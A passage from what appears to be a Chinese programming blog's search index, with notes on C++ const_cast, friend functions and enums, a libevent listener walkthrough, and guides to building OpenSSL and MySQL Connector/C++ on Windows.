都会调用。但你仍然会重复调用该函数，并且你仍然有重复的返回语句代码。 你真正想做的是实现一次 operator[] 功能并使用它两次。也就是说，你想让一个版本的 operator[] 调用 const operator[]。这就使得我们需要去除常量性。 去重复代码作为一般规则，转型是一个糟糕的想法，在实验《尽量少类型转换》整个实验来讨论这个问题，但代码重复也不是什么好事。在这种情况下，const operator[] 所做的与 operator[] 所做的事情相同，只有常量版本返回值类型受到常量约束。在这种情况下，将返回值中的 const 转型是安全的。因为不论调用 operator[] 还是 const operator[] 都一定首先有个非常量对象，否则就不能够调用非常量函数。所以用 operator[] 调用 const operator[] 是一个避免代码重复的安全做法，即使过程中需要一个转型动作。 12345678910111213141516171819202122232425262728// safeCast.h#ifndef __TEXTBLOCK_H__#define __TEXTBLOCK_H__#include &lt;iostream&gt;#include &lt;cstring&gt;class TextBlock&#123;public: const char&amp; operator[](std::size_t position) const &#123; // 边界检查 // 日志数据访问 // 验证数据完整性 return text[position]; &#125; char&amp; operator[](std::size_t position) &#123; return const_cast&lt;char&amp;&gt;(static_cast&lt;const TextBlock&amp;&gt;(*this)[position]); &#125;private: std::string text;&#125;;#endif // __TEXTBLOCK_H__ 如示例代码所示，代码有两个转型，而不是一个。第一次用来为 *this 添加 const 使得 operator[] 可以调用 const operator[]，第二次则是从 const operator[] 的返回值中去除常量性。 示例代码中使用 operator[] 调用 const operator[]，但如果只是单纯的调用会递归调用自己，那么代码会一直重复调用。为了避免无穷递归，调用时必须明确指出调用的是 const operator[]。 C++ 缺乏直接的语法可以去调用，因此将 *this 从其原始类型 TextBlock&amp; 转型为 const TextBlock&amp;。 使用 static_cast 添加常量性，强制进行了一次安全转型；再使用 const_cast 去除常量性。 const 修饰成员函数","tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"},{"name":"《Efficient C++》","slug":"《Efficient-C-》","permalink":"http://example.com/tags/%E3%80%8AEfficient-C-%E3%80%8B/"}],"categories":[{"name":"D_立志博览群书","slug":"D-立志博览群书","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"《Efficient C++》","slug":"D-立志博览群书/《Efficient-C-》","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8AEfficient-C-%E3%80%8B/"}]},{"title":"友元","date":"2023-10-27T01:24:02.446Z","path":"D_立志博览群书/《C++ primer plus》/第11章 使用类/友元/","text":"[toc] 友元C++ 提供了另外一种形式的访问权限：友元。友元有3种： 友元函数 友元类 友元成员函数 通过让函数成为类的友元，可以赋予该函数与类的成员函数相同的访问权限。 为何需要友元 在为类重载二元运算符时（带两个参数的运算符）常常需要友元。将 Time 对象乘以实数就属于这种情况。 下面的语句： 1A = B * 2.75； 将被转换成： 1A = B.operator*(2.75); 但下面的语句又如何呢? 1A = 2.75 * B; 从概念上说，2.75*B 与 B*2.75 相同，但第一个表达式不对应于成员函数，因为2.75不是 Timer 类型的对象。记住，左侧的操作数应是调用对象，但2.75不是对象。因此，编译器不能使用成员函数调用来替换该表达式。 解决这个难题的一种方式是，告知每个人（包括程序员自己），只能按 B*2.75 的格式编写，不能写成2.75*B。这是一种对服务器友好-客户警惕的（server-friendly, client-beware)解决方案，与OOP无关。 当然，上述的问题也有解决方案——非成员函数。非成员函数不是由对象调用的，它使用的所有值（包括对象）都是显式参数。这样，编译器能够将下面的表达式: 1A = 2.75 * B; 与下面的非成员函数调用匹配： 1A = operator*(2.75,B); 该函数的原型如下： 1Time operator*(double m, const Time &amp;t); 对于非成员重载运算符函数来说，运算符表达式左边的操作数对应于运算符函数的第一个参数，运算符表达式右边的操作数对应于运算符函数的第二个参数。而原来的成员函数可以访问类的私有成员，它们被称为友元函数。 创建友元创建友元函数的第一步是将其原型放在类声明中，并在原型声明前加上关键字 friend: 1friend Time operator*(double m, const Time &amp; t); 该原型意味着下面两点： 虽然 operator*() 函数是在类声明中声明的，但它不是成员函数，因此不能使用成员运算符来调用； 虽然 operator*() 函数不是成员函数，但它与成员函数的访问权限相同。 第二步是编写函数定义。因为它不是成员函数，所以不要使用 Time:: 限定符。另外，不要在定义中使用关键字 friend，定义如下： 12345678Time operator*(double m,const Tlme &amp; t)// frlend not ued in definition&#123; Time result; long totalminutes = t.hours * m * 60 + t.minutes * m; result.hours = totalminutes/60; result.minutes = totalminutes % 60; return result;&#125; 总之，类的友元函数是非成员函数，其访问权限与成员函数相同。","tags":[{"name":"《C++ primer plus》","slug":"《C-primer-plus》","permalink":"http://example.com/tags/%E3%80%8AC-primer-plus%E3%80%8B/"},{"name":"友元","slug":"友元","permalink":"http://example.com/tags/%E5%8F%8B%E5%85%83/"},{"name":"friend","slug":"friend","permalink":"http://example.com/tags/friend/"}],"categories":[{"name":"D_立志博览群书","slug":"D-立志博览群书","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"《C++ primer plus》","slug":"D-立志博览群书/《C-primer-plus》","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8AC-primer-plus%E3%80%8B/"},{"name":"第11章 使用类","slug":"D-立志博览群书/《C-primer-plus》/第11章-使用类","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8AC-primer-plus%E3%80%8B/%E7%AC%AC11%E7%AB%A0-%E4%BD%BF%E7%94%A8%E7%B1%BB/"}]},{"title":"C++ 枚举","date":"2023-10-27T01:24:02.444Z","path":"D_立志博览群书/《C++ primer plus》/enum/","text":"[toc] 枚举C++的枚举工具提供了另一种创建符号常量的方式，这种方式可以代替const。还允许定义新类型，但必须按严格的限制执行。使用enum的句法与struct类似。 enum color &#123; red, orange, blue, green, red, black&#125; 这条语句定义了一个名为color的新类型，它的取值范围为red, orange, blue, green, red, black，称为符号常量，同时将0~5分别对应于red~black。在默认情况下，0对应的是red,5对应的是black,其他以此类推。 声明与使用1234color cor1; //定义了一个类型为color的变量cor1//枚举变量的赋值cor1 = red; //正常赋值cor1 = 20; //非法，20不是枚举变量 由此可以看出，枚举变量的赋值受到限制，与程序员的定义有关。 对枚举而言，它的操作符只有赋值运算符=，这就意味着枚举变量不能执行++、--、+、—等等号以外的操作。 枚举量是整形，可被提升为int类型，但int类型不能自动转换为枚举类型 枚举可以进行强制类型转换，但不确定其结果，如cor1 = spectrum(100); 如果只打算使用常量，而不创建枚举类型的变量，则可以省略枚举类型的名称 enum &#123;red,orange&#125;； 设置枚举的值可以使用赋值运算符显式地来设置枚举量的值： 1enum bits &#123;one = 1, two = 2, three = 3&#125;; 但是，指定的值必须是整数。也可以只显式的设置其中一部分的值，默认情况下，枚举的 第一个常量始终是从0开始的，这一点需要注意。 1enum digits &#123;zero, one = 0, two, three = 1&#125;; 这里，zero和one的枚举量都为0,two和three都是1。 除了可以将int类型的值赋值给枚举量，还可以使用long和long long类型的值。 枚举的取值范围现在有指定了枚举量的枚举如下所示： 123enum bits(one = 1, two = 2,four = 4,eight = 8&#125;;bits myflag;myflag = bits(6); 问： 上述赋值是否合法 合法，虽然`6`不是枚举量，但它位于枚举定义的取值范围内。 关于取值范围的定义（参考C++ primer 第六版）： 1enum bigstep(firat,second = 100, third&#125;; 首先，要找出上限，需要知道枚举量的最大值。找到大于这个最大值的、最小的2的幂，将它减去1，得到的便是取值范围的上限。例如，定义的bigstep的最大值枚举值是101。在2的幂中，比这个数大的最小值为128，因此取值范围的上限为127。要计算下限，需要知道枚举量的最小值。如果它不小于0，则取值范围的下限为0∶否则，采用与寻找上限方式相同的方式，但加上负号。 例如，如果最小的枚举量为-6，而比它小的、最大的2的幂是-8（加上负号），因此下限为-7。选择用多少空间来存储枚举由编译器决定。对于取值范围较小的枚举，使用一个字节或更少的空间∶而对于包含 long类型值的枚举，则使用4个字节。 应用实例1234567891011121314151617#include &lt;iostream&gt;#include &quot;main.h&quot;using namespace std;enum myFlag &#123; one, two = 0, three, four = 1&#125;;int main()&#123; cout &lt;&lt; three &lt;&lt; endl; myFlag flag = myFlag(0); cout &lt;&lt; flag &lt;&lt; endl; system(&quot;pause&quot;); return 0;&#125; 输出结果： 10 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; enum color &#123; red=1, green, blue &#125;; enum color favorite_color; /* 用户输入数字来选择颜色 */ printf(&quot;请输入你喜欢的颜色: (1. red, 2. green, 3. blue): &quot;); scanf(&quot;%u&quot;, &amp;favorite_color); /* 输出结果 */ switch (favorite_color) &#123; case red: printf(&quot;你喜欢的颜色是红色&quot;); break; case green: printf(&quot;你喜欢的颜色是绿色&quot;); break; case blue: printf(&quot;你喜欢的颜色是蓝色&quot;); break; default: printf(&quot;你没有选择你喜欢的颜色&quot;); &#125; return 0;&#125; 请输入你喜欢的颜色: (1. red, 2. green, 3. blue): 1 你喜欢的颜色是红色 枚举进阶1. 位运算支持 在使用枚举时结合到 2进制 的强大，对枚举值自由的进行异或运算。 举例一： 1234567enum AttributeTargets&#123; Assembly = 0x0001, Class = 0x0002, Struct = 0x0004 ...&#125;; 举例二： 但是在 123456enum FileAccess&#123; Read = 0x1, Write = 0x2, ReadWrite = Read | Write&#125;; 2. 0值为简单枚举提供一个 0 值枚举量，可以考虑将其命名为 None。如果这个名对于特定的枚举不合适的时候，可以自行找一个准确的。 123456enum Compression&#123; None = 0, GZip, Deflate&#125;; 3. 用枚举代替define 在合适的情况下尽量使用枚举类型，而不是静态常量或 “#define” 值 。枚举 类型是一个具有一个静态常量集合的结构体。如果遵守这些规范，定义枚举类型，而不是带 有静态常量的结构体，您便会得到额外的编译器和反射支持，在调试代码时也能更加直观。 Good: 1234567enum Color&#123; Red, Green, Blue&#125;; bad: 1234567const int RED = 0;const int GREEN = 1;const int BLUE = 2;#define RED 0#define GREEN 1#define BLUE 2","tags":[{"name":"《C++ primer plus》","slug":"《C-primer-plus》","permalink":"http://example.com/tags/%E3%80%8AC-primer-plus%E3%80%8B/"},{"name":"enum","slug":"enum","permalink":"http://example.com/tags/enum/"}],"categories":[{"name":"D_立志博览群书","slug":"D-立志博览群书","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"《C++ primer plus》","slug":"D-立志博览群书/《C-primer-plus》","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8AC-primer-plus%E3%80%8B/"}]},{"title":"libevent——evconnlistener_new_bind(1)","date":"2023-10-27T01:24:02.442Z","path":"C_OpenSource/libevent/evconnlistener_new_bind(1)/","text":"libevent封装了监听套接字，将套接字和struct event统一管理。 官方的解释是： The evonnlistener mechanism gives you a way to listen for and accept incoming TCP connections 首先还是学习怎么去使用evconnlistener （一）接口1234567891011121314151617//创建struct evconnlistener *evconnlistener_new(struct event_base*base,evconnlistener_cb cb,void *ptr,unsigned flags ,int backlog,evutil_socket_t fd);struct evconnlistener*evconnlistener_new_bind(struct event_base*base,evconnlistener_cb cb,void *ptr,unsigned flags,int backlog,const struct sockaddr*sa,int socklen);void evconnlistener_free(struct evconnlistener*lev)//其中callback的定义如下：typedef void (*evconnlistener_cb)(struct evconnlistener *listener,evutil_socket_t sock, struct sockaddr*addr,int len,void *ptr);//enable 和 disableint evconnlistener_disable(struct evconnlistener *lev);int evconnlistener_enable(struct evconnlistener *lev);//调整callbackvoid evconnlistener_set_cb(struct evconnlistener*lev,evconnlistener_cb cb,void *arg)//检查evconnlistenerevutil_socket_t evconnlistener_get_fd(struct evconnlistener *lev)struct event_base *evconnlistener_get_base(struct evconnlistener*lev) evconnlistener是对 套接字和event 的封装，可以想见，在这些接口中，除了调用socket api之外，还会关联套接子到event上进而注册到event_base上去 不过接口封装好了这些行为，只需要了解这些参数的含义即可。 base：即event_basecb：当有新连接时调用的回调函数ptr：callback的参数flags：控制listner的行为backlog：同 listen(2)中backlog的含义fd：已经bind的fd，传入api让libevent做listen调用 （二）例子使用evconnlistener管理监听套接字构建一个简单的 echo server代码也可参考gayhub 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &lt;event2/listener.h&gt;#include &lt;event2/bufferevent.h&gt;#include &lt;event2/buffer.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;errno.h&gt;#include &lt;assert.h&gt;static void echo_read_cb(struct bufferevent*bev,void*ctx)&#123; struct evbuffer*input=bufferevent_get_input(bev); struct evbuffer*output=bufferevent_get_output(bev); evbuffer_add_buffer(output,input);&#125;static voidecho_event_cb(struct bufferevent*bev,short events,void*ctx)&#123; if(events&amp;BEV_EVENT_ERROR) perror(&quot;Error from bufferevent&quot;); if(events&amp;(BEV_EVENT_EOF|BEV_EVENT_ERROR)) &#123; bufferevent_free(bev); &#125;&#125;static voidaccept_error_cb(struct evconnlistener*listener,void*ctx)&#123; struct event_base*base=evconnlistener_get_base(listener); event_base_loopexit(base,NULL);&#125;void accept_conn_cb(struct evconnlistener*listener,evutil_socket_t fd,struct sockaddr*address,int socklen,void*ctx)&#123; struct event_base*base=evconnlistener_get_base(listener); struct bufferevent*bev = bufferevent_socket_new(base, fd, BEV_OPT_CLOSE_ON_FREE); bufferevent_setcb(bev,echo_read_cb,NULL,echo_event_cb,NULL); bufferevent_enable(bev,EV_READ|EV_WRITE);&#125;int main(int argc,char**argv)&#123; struct event_base *base; struct evconnlistener *listener; struct sockaddr_in sin; int port = 1025; base = event_base_new(); assert(base!=NULL); memset(&amp;sin,0,sizeof(sin)); sin.sin_family=AF_INET; sin.sin_addr.s_addr=htonl(0); sin.sin_port=htons(port); listener=evconnlistener_new_bind(base,//event_base accept_conn_cb,//cb NULL,// ptr LEV_OPT_CLOSE_ON_FREE|LEV_OPT_REUSEABLE,//flag -1,//backlog (struct sockaddr*)&amp;sin, sizeof(sin)); assert(listener!=NULL); evconnlistener_set_error_cb(listener,accept_error_cb); event_base_dispatch(base); return 0;&#125; （三）源码看看evconnlistenr做了哪些封装 3.1结构体1234567891011121314struct evconnlistener &#123; const struct evconnlistener_ops *ops; //一些回调函数 void *lock; evconnlistener_cb cb;// evconnlistener_errorcb errorcb; void *user_data;// unsigned flags; short refcnt; unsigned enabled : 1;&#125;;struct evconnlistener_event &#123; struct evconnlistener base; struct event listener;&#125;; evconnlistener结构体将一些基本的回调函数、用户数据等封装，然后evconnlistener_event将这些东西和struct event封装在一起 3.2创建一个evconnlistener看一下初始化有哪些内容： 1234567891011121314151617181920212223242526272829303132333435struct evconnlistener *evconnlistener_new(struct event_base *base, evconnlistener_cb cb, void *ptr, unsigned flags, int backlog, evutil_socket_t fd)&#123; struct evconnlistener_event *lev; if (backlog &gt; 0) &#123; if (listen(fd, backlog) &lt; 0)//调用listen return NULL; &#125; else if (backlog &lt; 0) &#123; if (listen(fd, 128) &lt; 0) return NULL; &#125; lev = mm_calloc(1, sizeof(struct evconnlistener_event)); if (!lev) return NULL; //lev-&gt;base是一个evconnlistener结构体 lev-&gt;base.ops = &amp;evconnlistener_event_ops;//设置ops参数 lev-&gt;base.cb = cb;//设置回调 lev-&gt;base.user_data = ptr;//ptr lev-&gt;base.flags = flags;//flag lev-&gt;base.refcnt = 1; if (flags &amp; LEV_OPT_THREADSAFE) &#123; EVTHREAD_ALLOC_LOCK(lev-&gt;base.lock, EVTHREAD_LOCKTYPE_RECURSIVE); &#125; //将fd关联到struct event上去 lev-&gt;listener是struct event结构体 //这样assigh将listener_read_cb设置到event的cb中，并将struct evconnlistner做为参数 //这是一个比较复杂的过程，首先由于event激活，将先调用listener_read_cb //在listener_read_cb通过传入的struct evconnlistner调用用户自定义回调 event_assign(&amp;lev-&gt;listener, base, fd, EV_READ|EV_PERSIST, listener_read_cb, lev); //这里底层调用event_enable evconnlistener_enable(&amp;lev-&gt;base); return &amp;lev-&gt;base;&#125; 在另外一个接口evconnlistener_new_bind中由于指定了套接字结构体，因此在底层还调用了bind 3.3 listener_read_cb这个底层的回调函数先于用户回调函数调用，在这个回调中会调用用户回调，并且会将已连接的套接字作为参数传入用户回调，这也正是evconnlistener的精髓，无需要用户进行listen、bind、accept等操作 123456789101112131415161718192021222324252627282930313233343536373839404142static voidlistener_read_cb(evutil_socket_t fd, short what, void *p)&#123; struct evconnlistener *lev = p; int err; evconnlistener_cb cb; evconnlistener_errorcb errorcb; void *user_data; LOCK(lev); while (1) &#123; struct sockaddr_storage ss; socklen_t socklen = sizeof(ss); evutil_socket_t new_fd = accept(fd, (struct sockaddr*)&amp;ss, &amp;socklen);//accept if (new_fd &lt; 0) break; if (socklen == 0) &#123; /* This can happen with some older linux kernels in * response to nmap. */ evutil_closesocket(new_fd); continue; &#125; if (!(lev-&gt;flags &amp; LEV_OPT_LEAVE_SOCKETS_BLOCKING)) evutil_make_socket_nonblocking(new_fd);//non blocking if (lev-&gt;cb == NULL) &#123; UNLOCK(lev); return; &#125; ++lev-&gt;refcnt; cb = lev-&gt;cb;//拿到用户回调 user_data = lev-&gt;user_data; UNLOCK(lev); cb(lev, new_fd, (struct sockaddr*)&amp;ss, (int)socklen, user_data);//调用用户回调并将connfd传入用户回调 LOCK(lev); if (lev-&gt;refcnt == 1) &#123; int freed = listener_decref_and_unlock(lev); EVUTIL_ASSERT(freed); return; &#125; --lev-&gt;refcnt; &#125;&#125; （四）参考1.libevent programming2.libevent 深入浅出","tags":[{"name":"Opensource","slug":"Opensource","permalink":"http://example.com/tags/Opensource/"},{"name":"libevent","slug":"libevent","permalink":"http://example.com/tags/libevent/"}],"categories":[{"name":"C_OpenSource","slug":"C-OpenSource","permalink":"http://example.com/categories/C-OpenSource/"},{"name":"libevent","slug":"C-OpenSource/libevent","permalink":"http://example.com/categories/C-OpenSource/libevent/"}]},{"title":"rapidjson 使用整理","date":"2023-10-27T01:24:02.420Z","path":"C_OpenSource/RapidJson/","text":"概述: rapidjson使用整理 RapidJSON: 首页 [toc]","tags":[{"name":"json","slug":"json","permalink":"http://example.com/tags/json/"},{"name":"opensource","slug":"opensource","permalink":"http://example.com/tags/opensource/"}],"categories":[{"name":"C_OpenSource","slug":"C-OpenSource","permalink":"http://example.com/categories/C-OpenSource/"}]},{"title":"Windows下编译OpenSSl 1.1.1","date":"2023-10-27T01:24:02.418Z","path":"C_OpenSource/OpenSSL/Windows下编译Openssl/","text":"概述： windows系统编译OpenSSL 1.1.1版本操作步骤 [toc] 0x01、编译环境说明 操作系统：win10 编译器：vs2017 OpenSSL: 1.1.1W 0x02、依赖工具说明根据官方说明，OpenSSL编译除了Visual Studio 2019以外，为方便编译，需要安装Strawberry Perl和NASM，下载地址分别如下： Strawberry Perl：Strawberry Perl for Windows NASM：NASM，这是一个汇编器 特别注意：Perl安装后会自动添加到环境变量中，而NASM不会，一定要在环境变量Path中添加NASM.exe所在的目录，否则可能会出现意想不到的错误。 0x03、编译步骤下载源码从Github中可以直接下载：GitHub - openssl&#x2F;openssl: TLS&#x2F;SSL and crypto library 或者在 OpenSSL 官方去下载 OpenSSL 也可以参考官方文档进行编译：openssl&#x2F;NOTES-WINDOWS.md at master · openssl&#x2F;openssl 0x04、编译 使用管理员权限打开 vs2017 的开发人员命令提示符 .dypjxsuqynig{zoom:80%;} 打开后切换到 openssl 解压目录： .bewytghnrgdq{zoom:50%;} 配置 Perl，参考官方文档配置 perl Configure VC-WIN32 if you want 32-bit OpenSSL or perl Configure VC-WIN64A if you want 64-bit OpenSSL or perl Configure VC-WIN64-ARM if you want Windows on Arm (win-arm64) OpenSSL or perl Configure VC-WIN64-CLANGASM-ARM if you want Windows on Arm (win-arm64) OpenSSL with assembly support using clang-cl as assembler or perl Configure VC-CLANG-WIN64-CLANGASM-ARM if you want Windows on Arm (win-arm64) OpenSSL using clang-cl as both compiler and assembler or perl Configure VC-WIN32-HYBRIDCRT if you want 32-bit OpenSSL dependent on the Universal CRT or perl Configure VC-WIN64A-HYBRIDCRT if you want 64-bit OpenSSL dependent on the Universal CRT or perl Configure to let Configure figure out the platform 特别注意：–prefix选项指定的安装路径必须是绝对路径，若不指定，则默认会安装在C:\\Program Files (x86)\\下面，如果你不是用管理员权限执行，则会出现*Permission Denied* 错误，切记。 1perl Configure VC-WIN32 --prefix=E:\\OpenSSL # 将其安装到 E:\\OpenSSL 目录 nmake nmake test namke install 0x05、使用使用时，在工程引入文件和库文件添加 Openssl 安装目录即可。 0x06、补充说明如果要编译 /mt、/mtd、mdd 等版本，则需要修改 makefile 文件。 使用 perl 命令后会生成 makefile 文件。 1234567perl Configure VC-WIN32 --prefix=D:\\OpenSSL-3.1-Win32-mtd# 静态库perl Configure VC-WIN32 shared no-asm no-shared --prefix=&quot;D:\\OpenSSL-Static\\mtd&quot;# Debug 版本perl Configure debug-VC-WIN32 shared no-asm no-shared --prefix=&quot;D:\\OpenSSL-Static\\mtd&quot; makefile 文件修改 CNF_CFLAGS 配置，如下所示： 123456CNF_ASFLAGS=-f win32CNF_CPPFLAGS=-D&quot;OPENSSL_SYS_WIN32&quot; -D&quot;WIN32_LEAN_AND_MEAN&quot; -D&quot;UNICODE&quot; -D&quot;_UNICODE&quot; -D&quot;_CRT_SECURE_NO_DEPRECATE&quot; -D&quot;_WINSOCK_DEPRECATED_NO_WARNINGS&quot; -D&quot;OPENSSL_USE_APPLINK&quot; -D&quot;NDEBUG&quot;CNF_CFLAGS=/Gs0 /GF /Gy /MD # 修改为你需要编译的模式 /MD /MDd /MT /MTdCNF_CXXFLAGS=CNF_LDFLAGS=CNF_EX_LIBS=ws2_32.lib gdi32.lib advapi32.lib crypt32.lib user32.lib 在编译一次之后如果需要重新编译，则需要清除缓存，清楚缓存命令： 1nmake clean 补充完整编译如下： 1234567891011121314151617181920perl Configure debug-VC-WIN64A no-asm --prefix=e:\\openssl_x64\\debugnmakenmake install# 把e:\\openssl_x64\\debug改名为e:\\openssl_x64\\debug_mdd# 完了之后把makefile文件以及configdata.pm文件里面的/MDD改为MTDnmake cleannmakenmake install# 把e:\\openssl_x64\\debug改名为e:\\openssl_x64\\debug_mtd perl Configure VC-WIN64A no-asm --prefix=e:\\openssl_x64\\releasenmake cleannmakenmake install# 把e:\\openssl_x64\\release改名为e:\\openssl_x64\\release_md# 完了之后把makefile文件以及configdata.pm文件里面的/MD改为MTnmake cleannmakenmake install# 把e:\\openssl_x64\\release改名为e:\\openssl_x64\\release_mt","tags":[],"categories":[{"name":"C_OpenSource","slug":"C-OpenSource","permalink":"http://example.com/categories/C-OpenSource/"},{"name":"OpenSSL","slug":"C-OpenSource/OpenSSL","permalink":"http://example.com/categories/C-OpenSource/OpenSSL/"}]},{"title":"Windows下MySQL Connector/C++ 8.1编译说明","date":"2023-10-27T01:24:02.417Z","path":"C_OpenSource/MySQL/mysql-connnector-8.0编译说明/","text":"概述：本文主要记录 MySQL Connector&#x2F;C++ 8.1 静态库的编译方式，因项目工程问题，需要编译 /MT 模式的静态库文件。 官方文档：4.3 从源安装连接器&#x2F;C++_MySQL 连接器&#x2F;C++ 8.0 开发人员指南 本次编译目标产物： Debug 模式下 &#x2F;MTd 编译 静态编译 Release 模式下 &#x2F;MT 编译 静态编译 前言需求及官方文件说明由于 MySQL官方并没有提供 &#x2F;MT 模式的lib文件，因此编译所需要的静态库都需要从源码编译，首先说明一下官方已编译好的文件： 在 MySQL :: MySQL Connector&#x2F;C++ Developer Guide :: 5.2.1 Windows Notes 这里可以看到官方提供了 /MD 模式下的 Debug 和 Release 静态库文件，下载为：MySQL :: Download MySQL Connector&#x2F;C++ (Archived Versions)。关于下载后安装包的文件这我补充一下： mysql-connector-c++-8.0.33-win32-debug：Debug 模式下 /MD 的编译产物 mysql-connector-c++-8.0.33-win32：Release 模式下 /MD 的编译产物 两个下载包的文件基本一致，主要是以下四个文件： mysqlcppconn.lib: 使用 &#x3D;&#x3D;JDBC+openssl1.1.1&#x3D;&#x3D; 版本编译 mysqlcppconn8.lib：使用 &#x3D;&#x3D;X DEVAPI+openssl1.1.1&#x3D;&#x3D; 编译产物 mysqlcppconn8-static.lib：使用 &#x3D;&#x3D;X DEVAPI+OpenSSL3.3.1&#x3D;&#x3D; 编译产物 mysqlcppconn-static.lib：使用 &#x3D;&#x3D;JDBC+OpenSSL3.3.31&#x3D;&#x3D; 编译产物 使用 &#x3D;&#x3D;JDBC&#x3D;&#x3D; 和 &#x3D;&#x3D;X DEVAPI&#x3D;&#x3D; 的包需要使用不同的方式去连接 MySQL，具体代码如下所示： 使用 JDBC 连接代码123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;list&gt;#include &lt;cstdlib&gt;#include &lt;mysqlx/xdevapi.h&gt;using namespace mysqlx;#ifdef _DEBUG#pragma comment(lib, &quot;mysqlcppconn8-static-debug-openssl3-mdd.lib&quot;) // 特殊命名标记了一下，官方库文件下 mysqlcppconn8_static.lib#pragma comment(lib, &quot;dnsapi.lib&quot;)#else#pragma comment(lib, &quot;mysqlcppconn8_md.lib&quot;)// 特殊命名标记了一下，官方库文件下 mysqlcppconn8_static.libs#pragma comment(lib, &quot;dnsapi.lib&quot;)#endif // DEBUGint main() &#123; // 修改控制台编码 // std::system(&quot;chcp 65001&quot;); try &#123; // 改成你的信息b Session sess(SessionOption::USER, &quot;root&quot;, SessionOption::PWD, &quot;123456&quot;, SessionOption::HOST, &quot;localhost&quot;, SessionOption::PORT, 33060, SessionOption::DB, &quot;test&quot;); auto result = sess.sql(&quot;select * from user&quot;).execute(); for (auto row : result.fetchAll()) &#123; std::cout &lt;&lt; row[0] &lt;&lt; &quot; &quot; &lt;&lt; row[1] &lt;&lt; &quot; &quot; &lt;&lt; row[2] &lt;&lt; &quot;\\n&quot;; &#125; &#125; catch (const std::exception&amp; e) &#123; std::cerr &lt;&lt; e.what() &lt;&lt; &#x27;\\n&#x27;; &#125;&#125; 预处理器参考官方说明：For applications that use X DevAPI, X DevAPI for C, or (as of Connector&#x2F;C++ 8.0.16) the legacy JDBC API, define the STATIC_CONCPP macro. All that matters is that you define it; the value does not matter. For example: -DSTATIC_CONCPP 使用 JDBC 连接编译时，需要在预处理器添加 STATIC_CONCPP 宏。 特别的，如果执行以上步骤之后还是编译报错，需要根据相关报错信息链接其他的库。如 MSCVRT.lib 使用cmkae生成工程文件 有其他特殊需求参考官方说明：MySQL :: MySQL Connector&#x2F;C++ Developer Guide :: 4.3 Installing Connector&#x2F;C++ from Source 官方要求安装boost库，实际编译不安装boost也可以编译成功。 编译命令如下所示： 1cmake . -G &quot;Visual Studio 15&quot; -A Win32 -DBUILD_STATIC=ON -DWITH_SSL=&quot;D:\\OpenSSL-3.1-Win32-mtd&quot; -DWITH_JDBC=ON -DWITH_MYSQL=&quot;C:\\Program Files\\MySQL\\MySQL Server 8.0&quot; 生成 vs2017工程（v141工具集）下的工程文件，产物为静态库，OpenSSL安装位置为 &quot;D:\\OpenSSL-3.1-Win32-mtd。说明： -G “Visual Studio 16”：指定工具集 -A Win32 指定生成的系统 -DBUILD_STATIC&#x3D;ON：指定生成静态库 -DWITH_SSL&#x3D;”D:\\OpenSSL-3.1-Win32-mtd”：指定 OpenSSL 的安装位置 -DWITH_MYSQL&#x3D;”C:\\Program Files\\MySQL\\MySQL Server 8.0”：指定 mysql的安装位置 -DWITH_JDBC&#x3D;ON：指定编译JDBC 由于需要 /MT 版本的，因此 OpenSSL 也需要自己编译 /MT 版本的才可以。","tags":[],"categories":[{"name":"C_OpenSource","slug":"C-OpenSource","permalink":"http://example.com/categories/C-OpenSource/"},{"name":"MySQL","slug":"C-OpenSource/MySQL","permalink":"http://example.com/categories/C-OpenSource/MySQL/"}]},{"title":"MySQL caching_sha2_password 加密原理和连接过程","date":"2023-10-27T01:24:02.413Z","path":"C_OpenSource/MySQL/MySQL 加密原理/","text":"概述：MySQL8 版本加密原理和连接过程说明 参考文章：MYSQL caching_sha2_password 加密原理和连接过程(FULL)-腾讯云开发者社区-腾讯云 使用Python连接MySQLrsa加密使用的pymysql的. 因为不属于本文的内容 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247import hashlibimport structimport socketimport os#来自pymysqlfrom cryptography.hazmat.backends import default_backendfrom cryptography.hazmat.primitives import serialization, hashesfrom cryptography.hazmat.primitives.asymmetric import paddingdef btoint(bdata,t=&#x27;little&#x27;): return int.from_bytes(bdata,t)#来自pymysqldef _lenenc_int(i): if i &lt; 0: raise ValueError(&quot;Encoding %d is less than 0 - no representation in LengthEncodedInteger&quot; % i) elif i &lt; 0xFB: return bytes([i]) elif i &lt; (1 &lt;&lt; 16): return b&quot;\\xfc&quot; + struct.pack(&quot;&lt;H&quot;, i) elif i &lt; (1 &lt;&lt; 24): return b&quot;\\xfd&quot; + struct.pack(&quot;&lt;I&quot;, i)[:3] elif i &lt; (1 &lt;&lt; 64): return b&quot;\\xfe&quot; + struct.pack(&quot;&lt;Q&quot;, i) else: raise ValueError(&quot;Encoding %x is larger than %x - no representation in LengthEncodedInteger&quot;% (i, (1 &lt;&lt; 